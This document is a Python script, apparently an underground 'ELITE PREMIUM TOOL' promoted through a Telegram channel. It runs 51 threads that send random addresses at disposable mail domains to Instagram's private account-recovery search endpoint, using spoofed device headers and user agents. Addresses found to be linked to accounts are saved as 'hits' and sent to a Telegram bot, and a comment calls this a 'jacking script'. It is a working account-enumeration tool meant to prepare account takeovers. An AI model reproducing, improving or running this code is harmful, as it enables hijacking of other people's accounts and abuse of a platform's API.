import requests as kira1
from datetime import datetime as kira2
import time as kira3
import sys as kira4
import os as kira5
import random as kira6
import secrets as kira7
import uuid as kira8
import json as kira9
import base64 as kira10
from threading import Thread as kira11, Lock as kira12
from cfonts import render as kira13

def kira14():
    kira5.system('cls' if kira5.name == 'nt' else 'clear')

kira15 = kira12()
kira16 = kira12()
_STATS_LOCK = kira12()
_PRINT_LOCK = kira12()

# ==========================================
# JACKING SCRIPT (UNTOUCHED - SAFE)
# ==========================================
def kira17(kira18):
    kira19 = "https://i.instagram.com/api/v1/bloks/async_action/com.bloks.www.caa.ar.search.async/"
    kira20 = str(kira8.uuid4())
    kira21 = str(kira8.uuid4())
    kira22 = "android-" + kira7.token_hex(8)
    kira23 = [
        "samsung", "Google", "Xiaomi", "OnePlus", "Nothing", "HUAWEI", "OPPO", "vivo",
        "realme", "motorola", "Sony", "Nokia", "LG", "HTC", "ASUS", "ZTE", "Lenovo",
        "TCL", "Honor", "Infinix", "Tecno", "itel", "POCO", "Redmi", "Meizu", "BlackBerry",
        "Alcatel", "Sharp", "Panasonic", "Micromax", "Lava", "Karbonn", "Wiko", "Fairphone",
        "CAT", "Doogee", "Ulefone", "Umidigi", "Blackview", "Oukitel", "Cubot", "Elephone",
        "LeEco", "Coolpad", "Gionee", "Vsmart", "Bkav", "Archos", "Essential", "Razer",
        "Vertu", "Turing", "Punkt", "Crosscall", "AGM", "Ulefone", "Oukitel", "Wiko",
        "Apple", "iPhone", "iPad"
    ]
    kira24 = [
        "SM-G973F", "Pixel 7", "M2102J20SG", "ONEPLUS A6003", "A063",
        "SM-G991B", "SM-G996B", "SM-G998B", "SM-S901B", "SM-S906B", "SM-S908B",
        "SM-A525F", "SM-A725F", "SM-A336B", "SM-A536B", "SM-A736B",
        "SM-N986B", "SM-N981B", "SM-F926B", "SM-F711B",
        "Pixel 4", "Pixel 4a", "Pixel 5", "Pixel 5a", "Pixel 6", "Pixel 6a", "Pixel 6 Pro",
        "Pixel 7a", "Pixel 7 Pro", "Pixel 8", "Pixel 8 Pro", "Pixel 8a",
        "Nexus 5", "Nexus 6", "Nexus 5X", "Nexus 6P",
        "M2101K7AG", "M2101K6G", "M2103K19G", "2201117TY", "2201123G",
        "Redmi Note 10", "Redmi Note 11", "Redmi Note 12", "Redmi 9", "Redmi 10",
        "POCO X3", "POCO X4", "POCO F3", "POCO F4", "POCO M3", "POCO M4",
        "Mi 10", "Mi 11", "Mi 12", "Mi 13", "Mi Mix 4",
        "ONEPLUS A5000", "ONEPLUS A5010", "ONEPLUS A6000", "ONEPLUS A6010",
        "IN2023", "IN2025", "LE2101", "LE2121", "CPH2451", "CPH2449",
        "M2007J3SY", "M2007J3SG", "M2012K11AG", "M2102K1AC",
        "V2027", "V2045", "V2109", "V2130", "V2145", "V2204", "V2230",
        "RMX2001", "RMX1921", "RMX1971", "RMX1992", "RMX2002", "RMX2061",
        "CPH2001", "CPH2015", "CPH2083", "CPH2173", "CPH2185",
        "moto g(30)", "moto g(50)", "moto g(60)", "moto g power", "moto edge 20",
        "XQ-AT51", "XQ-AT52", "XQ-BC72", "XQ-CT54", "XQ-DQ54",
        "Nokia 7.2", "Nokia 8.3", "Nokia G20", "Nokia X20", "Nokia 5.4",
        "LM-G900", "LM-V600", "LM-G910",
        "HTC U11", "HTC U12+", "HTC Desire 20+",
        "ASUS_I001DA", "ASUS_I002D", "ASUS_I005DA", "ASUS_I006D",
        "ZTE A2020", "ZTE Blade 20", "ZTE Axon 30",
        "Lenovo K14", "Lenovo Z6", "Lenovo Tab P11",
        "TCL 20", "TCL 20 Pro", "TCL 30",
        "ANY-LX1", "ANY-LX2", "ANY-LX3", "BVL-N49", "BVL-NX1",
        "Infinix X6815", "Infinix X6817", "Infinix X688", "Infinix X690",
        "TECNO KE5", "TECNO KI5", "TECNO KG5", "TECNO KD7",
        "itel A661L", "itel L6006", "itel P661L",
        "iPhone 6", "iPhone 6 Plus", "iPhone 6s", "iPhone 6s Plus",
        "iPhone 7", "iPhone 7 Plus", "iPhone 8", "iPhone 8 Plus",
        "iPhone X", "iPhone XR", "iPhone XS", "iPhone XS Max",
        "iPhone 11", "iPhone 11 Pro", "iPhone 11 Pro Max",
        "iPhone 12", "iPhone 12 mini", "iPhone 12 Pro", "iPhone 12 Pro Max",
        "iPhone 13", "iPhone 13 mini", "iPhone 13 Pro", "iPhone 13 Pro Max",
        "iPhone 14", "iPhone 14 Plus", "iPhone 14 Pro", "iPhone 14 Pro Max",
        "iPhone 15", "iPhone 15 Plus", "iPhone 15 Pro", "iPhone 15 Pro Max",
        "iPad 9", "iPad 10", "iPad Air 4", "iPad Air 5", "iPad Pro 11", "iPad Pro 12.9",
        "Galaxy Tab S7", "Galaxy Tab S8", "Galaxy Tab S9", "Galaxy Tab A8",
        "Xiaomi Pad 5", "Xiaomi Pad 6", "Lenovo Tab M10", "Lenovo Tab P12"
    ]
    kira25 = ["160", "240", "280", "320", "360", "400", "420", "440", "450", "480", "520", "560", "640"]
    kira26 = [
        "480x800", "540x960", "720x1280", "720x1440", "720x1520", "720x1600",
        "750x1334", "828x1792", "1080x1920", "1080x2160", "1080x2280", "1080x2340",
        "1080x2400", "1080x2520", "1125x2436", "1170x2532", "1179x2556",
        "1242x2208", "1242x2688", "1284x2778", "1290x2796", "1440x2560",
        "1440x2960", "1440x3040", "1440x3088", "1440x3200", "1600x2560",
        "1644x2360", "1668x2224", "1668x2388", "2048x1536", "2048x2732",
        "2560x1600", "2732x2048"
    ]
    kira27 = ["8", "9", "10", "11", "12", "13", "14", "15"]
    kira28 = [180, 190, 200, 210, 220, 230, 240, 250, 260, 270, 280, 290, 300, 310, 320, 330, 340, 350]
    kira29 = kira6.choice(kira23)
    kira30 = kira6.choice(kira24)
    kira31 = kira6.choice(kira25)
    kira32 = kira6.choice(kira26)
    kira33 = kira6.choice(kira27)
    kira34 = kira6.choice(kira28)
    kira35 = f"Instagram {kira34}.0.0.{kira6.randint(10,99)} Android ({kira33}; {kira31}dpi; {kira32}; {kira29}; {kira30}; en_US)"
    kira36 = str(kira6.choice([0, 60, 120, 180, 240, 300, 330, 360, 420, 480, 540, 570, 600, 660, 720]))
    kira37 = {
        'params': kira9.dumps({
            "client_input_params": {
                "aac": kira9.dumps({
                    "aac_init_timestamp": int(kira3.time()),
                    "aacjid": str(kira8.uuid4()),
                    "aaccs": kira7.token_urlsafe(32)
                }),
                "flash_call_permissions_status": {
                    "READ_PHONE_STATE": "PERMANENTLY_DENIED",
                    "READ_CALL_LOG": "DENIED",
                    "ANSWER_PHONE_CALLS": "DENIED"
                },
                "was_headers_prefill_available": 0,
                "network_bssid": None,
                "sfdid": "",
                "fetched_email_token_list": {},
                "search_query": kira18,
                "auth_secure_device_id": "",
                "ig_oauth_token": [],
                "cloud_trust_token": None,
                "was_headers_prefill_used": 0,
                "sso_accounts_auth_data": [],
                "encrypted_msisdn": "",
                "device_network_info": None,
                "text_input_id": f"akyuf0:{kira6.randint(50, 70)}",
                "zero_balance_state": None,
                "android_build_type": "release",
                "accounts_list": [],
                "is_oauth_without_permission": 0,
                "ig_android_qe_device_id": kira20,
                "gms_incoming_call_retriever_eligibility": "client_not_supported",
                "search_screen_type": "email_or_username",
                "is_whatsapp_installed": 1,
                "lois_settings": {"lois_token": ""},
                "ig_vetted_device_nonce": None,
                "headers_infra_flow_id": "",
                "fetched_email_list": []
            },
            "server_params": {
                "event_request_id": str(kira8.uuid4()),
                "is_from_logged_out": 0,
                "layered_homepage_experiment_group": None,
                "device_id": kira22,
                "login_surface": "login_home",
                "waterfall_id": str(kira8.uuid4()),
                "INTERNAL__latency_qpl_instance_id": kira6.uniform(6.3e13, 6.5e13),
                "is_platform_login": 0,
                "context_data": "",
                "login_entry_point": "logged_out",
                "INTERNAL__latency_qpl_marker_id": 36707139,
                "family_device_id": kira21,
                "offline_experiment_group": "caa_iteration_v3_perf_ig_4",
                "access_flow_version": "pre_mt_behavior",
                "is_from_logged_in_switcher": 0,
                "qe_device_id": kira20
            }
        }),
        'bk_client_context': kira9.dumps({
            "bloks_version": "5e47baf35c5a270b44c8906c8b99063564b30ef69779f3dee0b828bee2e4ef5b",
            "styles_id": "instagram"
        }),
        'bloks_versioning_id': "5e47baf35c5a270b44c8906c8b99063564b30ef69779f3dee0b828bee2e4ef5b"
    }
    kira38 = {
        'User-Agent': kira35,
        'accept-language': 'en-IN, en-US',
        'x-bloks-version-id': "5e47baf35c5a270b44c8906c8b99063564b30ef69779f3dee0b828bee2e4ef5b",
        'x-fb-friendly-name': 'IgApi: bloks/async_action/com.bloks.www.caa.ar.search.async/',
        'x-ig-android-id': kira22,
        'x-ig-app-id': '567067343352427',
        'x-ig-app-locale': 'en_IN',
        'x-ig-device-id': kira20,
        'x-ig-family-device-id': kira21,
        'x-ig-timezone-offset': kira36,
        'x-mid': kira10.urlsafe_b64encode(kira7.token_bytes(18)).decode().rstrip('='),
        'x-pigeon-rawclienttime': str(kira3.time()),
        'x-pigeon-session-id': f'UFS-{kira8.uuid4()}-0',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'
    }
    try:
        kira39 = kira1.post(kira19, data=kira37, headers=kira38, timeout=20)
        if kira18.lower() in kira39.text.lower():
            return True
        return False
    except Exception as kira40:
        return False
# ==========================================

kira41 = '\033[1;31m'
kira42 = '\033[1;32m'
kira43 = '\033[1;33m'
kira44 = '\033[1;36m'
kira45 = '\033[0m'

kira46 = 0
kira47 = 0
kira48 = 0

# ---------- ANIMATION HELPERS ----------
def kira_type(text, delay=0.02, color='\033[1;37m'):
    for ch in text:
        kira4.stdout.write(color + ch + '\033[0m')
        kira4.stdout.flush()
        kira3.sleep(delay)
    print()

def kira_hacker_text(text, loops=5):
    chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%&*"
    for i in range(len(text)):
        for _ in range(loops):
            glitch = list(text)
            for j in range(i, len(text)):
                glitch[j] = kira6.choice(chars)
            kira4.stdout.write('\033[1;32m' + ''.join(glitch) + '\033[0m')
            kira4.stdout.flush()
            kira3.sleep(0.015)
            kira4.stdout.write('\r')
        kira4.stdout.write('\033[1;31m' + text[:i+1] + '\033[0m')
        kira4.stdout.flush()
    print()
# ---------------------------------------

def kira49():
    kira14()
    
    # Animated Top Matrix Lines
    for _ in range(2):
        line = ''.join(kira6.choice('01') for _ in range(35))
        print('\033[1;32m' + line + '\033[0m')
        kira3.sleep(0.05)
    
    print()
    
    # The Main Banner (CFonts Elite + Kira)
    try:
        b1 = kira13('ELITE', colors=['red', 'white'], align='center')
        print(b1)
        b2 = kira13('KIRA', colors=['white', 'red'], align='center')
        print(b2)
    except Exception:
        pass
        
    # Typing Animation for Title
    kira_type("       [ PREMIUM TOOL ]       ", delay=0.03, color='\033[1;35m')
    kira_type("      @ELITEOWNERKIRA        ", delay=0.02, color='\033[1;33m')
    print()
    
    # Clean Layout (No cut-off boxes)
    print("\033[1;36m  ➜ STATUS  : \033[1;32mONLINE\033[0m")
    print("\033[1;36m  ➜ CHANNEL : \033[1;35mt.me/ELITEEMPIREX2\033[0m")
    print("\033[1;36m  ➜ VERSION : \033[1;33mv3.5 PREMIUM\033[0m")
    print("\033[1;31m  -----------------------------------\033[0m")
    print()

    # Simple Boot Loading
    kira4.stdout.write('\033[1;32m  Booting ELITE CORE \033[0m')
    for _ in range(3):
        kira4.stdout.write('\033[1;31m.\033[0m')
        kira4.stdout.flush()
        kira3.sleep(0.3)
    print('\n')

    # AUTO OPEN CHANNEL (FIXED)
    try:
        import webbrowser
        webbrowser.open("https://t.me/ELITEEMPIREX2")
    except Exception:
        pass

kira49()

kira51 = '\033[1;33m'
kira52 = '\033[1;36m'

kira53 = input(f'\n {kira52} 𝗘𝗡𝗧𝗘𝗥 𝗧𝗢𝗞𝗘𝗡 ➜   ' + kira51).strip()
print("\033[1;31m -----------------------------------\033[0m")
kira54 = input(f' {kira52} 𝗘𝗡𝗧𝗘𝗥 𝗜𝗗 ➜   ' + kira51).strip()
print("\033[1;31m -----------------------------------\033[0m")
kira3.sleep(1)
kira14()

if not kira53 or not kira54:
    print('\033[1;31m[!] Telegram token/chat_id missing. Hits will not be sent.\033[0m')
    kira3.sleep(2)

def kira55():
    if not _PRINT_LOCK.acquire(blocking=False):
        return
    try:
        with _STATS_LOCK:
            hits, bad, tok = kira46, kira47, kira48
        kira14()
        # Clean Dashboard
        print(f'''
\033[1;31m   ⚡ 𝗘𝗟𝗜𝗧𝗘 𝗣𝗥𝗘𝗠𝗜𝗨𝗠 𝗧𝗢𝗢𝗟 ⚡
\033[1;35m  -----------------------------------

\033[1;32m   𝗛𝗜𝗧𝗦  ➜ [ {hits} ]
\033[1;33m   𝗕𝗔𝗗   ➜ [ {bad} ]
\033[1;36m   𝗧𝗢𝗞𝗘𝗡 ➜ [ {tok} ]

\033[1;31m   𝐎𝐖𝐍𝐄𝐑   ➜ @ELITEOWNERKIRA
\033[1;35m   𝐂𝐇𝐀𝐍𝐍𝐄𝐋 ➜ t.me/ELITEEMPIREX2
\033[1;31m  -----------------------------------
    ''')
        kira4.stdout.flush()
    finally:
        _PRINT_LOCK.release()

def kira56(kira57):
    global kira46
    kira58 = f"""
⚡ 𝗣𝗥𝗘𝗠𝗜𝗨𝗠 𝗛𝗜𝗧𝗦 𝗕𝗬 𝗘𝗟𝗜𝗧𝗘 ⚡
-----------------------------------
✉️ 𝐄𝐌𝐀𝐈𝐋  ➜ {kira57}
-----------------------------------
📢 𝐉𝐎𝐈𝐍 ➜ t.me/ELITEEMPIREX2
👑 𝐎𝐖𝐍𝐄𝐑 ➜ @ELITEOWNERKIRA
💎 𝐕𝐄𝐑𝐒𝐈𝐎𝐍 ➜ v3.5 PREMIUM
-----------------------------------
"""
    kira59 = f"https://api.telegram.org/bot{kira53}/sendMessage"
    kira60 = {'chat_id': kira54, 'text': kira58}
    with kira16:
        for kira61 in range(5):
            try:
                kira62 = kira1.post(kira59, data=kira60, timeout=20)
                if kira62.status_code == 200 and kira62.json().get('ok'):
                    return
            except Exception:
                pass
            kira3.sleep(1)

def kira63():
    global kira46, kira47, kira48
    kira55()

def kira64():
    kira65 = 'abcdefghijklmnopqrstuvwxyz'
    kira66 = kira6.randint(6,7)
    kira67 = ''.join(kira6.choices(kira65, k=kira66))
    return kira67

def kira68(kira57):
    kira69 = f"""
⚡ 𝗣𝗥𝗘𝗠𝗜𝗨𝗠 𝗛𝗜𝗧𝗦 𝗕𝗬 𝗘𝗟𝗜𝗧𝗘 ⚡
-----------------------------------
✉️ 𝐄𝐌𝐀𝐈𝐋 ➜ {kira57}
-----------------------------------
📢 𝐉𝐎𝐈𝐍 ➜ t.me/ELITEEMPIREX2
👑 𝐎𝐖𝐍𝐄𝐑 ➜ @ELITEOWNERKIRA
-----------------------------------
"""
    with kira15:
        for kira61 in range(5):
            try:
                with open('/sdcard/ELITE-Hi2-kira.txt', 'a', encoding='utf-8') as kira70:
                    kira70.write(kira69 + '\n')
                    kira70.flush()
                    kira5.fsync(kira70.fileno())
                return
            except Exception:
                kira3.sleep(0.5)

def kira71(kira72):
    global kira46, kira47, kira48
    while True:
        kira73 = kira64()
        if kira72 == '1':
            kira74 = '@hi2.in'
        elif kira72 == '2':
            kira74 = '@telegmail.com'
        else:
            kira74 = '@hi2.in'
        kira57 = f'{kira73}{kira74}'
        with _STATS_LOCK:
            kira48 += 1
        kira63()
        if kira17(kira57):
            with _STATS_LOCK:
                kira46 += 1
            kira63()
            print(f'{kira42}HİT | {kira57}{kira45}')
            kira68(kira57)
            kira56(kira57)
        else:
            with _STATS_LOCK:
                kira47 += 1
            kira63()

if __name__ == '__main__':
    while True:
        kira14()
        kira49()
        
        # Clean Menu (No cut-offs)
        print(f"""
\033[1;31m   ⚡ 𝗘𝗟𝗜𝗧𝗘 𝗣𝗥𝗘𝗠𝗜𝗨𝗠 𝗧𝗢𝗢𝗟 ⚡
\033[1;35m  -----------------------------------
  
\033[1;32m   [1] 🔥 𝗛𝗜𝟮 𝗠𝗔𝗜𝗟
\033[1;36m   [2] 💎 𝗧𝗘𝗟𝗘𝗚𝗥𝗔𝗠 𝗠𝗔𝗜𝗟

\033[1;35m  -----------------------------------
\033[1;33m   👑 Owner   ➜ @ELITEOWNERKIRA
\033[1;35m   📢 Channel ➜ t.me/ELITEEMPIREX2
\033[1;31m  -----------------------------------
\033[0m""")
  
        kira72 = input(f"\033[1;36m  ┌── 𝗦𝗘𝗟𝗘𝗖𝗧 𝗢𝗣𝗧𝗜𝗢𝗡 ┐\n  └──➜ \033[1;33m").strip()
        if kira72 in ['1', '2']:
            break
    kira14()
    print("\033[1;32m  [+] STARTING THREADS...\033[0m")
    kira3.sleep(1)
    for kira75 in range(51):
        kira11(target=kira71, args=(kira72,)).start()